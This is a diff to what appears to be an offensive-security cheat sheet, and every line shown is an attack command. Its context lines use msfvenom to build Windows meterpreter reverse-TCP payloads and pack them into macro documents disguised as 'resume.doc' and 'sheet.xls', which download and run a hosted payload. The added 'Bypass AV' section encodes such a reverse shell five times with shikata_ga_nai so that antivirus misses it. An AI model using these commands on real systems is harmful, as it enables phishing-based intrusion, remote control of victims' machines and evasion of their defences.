@@ -83,3 +83,7 @@ Create payload with msfvenom
 - `msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=<Host_ip> LPORT=1234 | .\marco_pack.exe -o -G "resume.doc"` Direct inject payload to marco of file
 - `msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=<Host_ip> LPORT=1234 -f exe > payload.exe` -> Host the payload
   - `echo "http:\\Host_ip\payload.exe" "payload.exe" | .\marco_pack.exe -o -G "sheet.xls"` -> Generate the document to download payload and execute it
+
+## Bypass AV
+
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 > rTCPenc.exe`
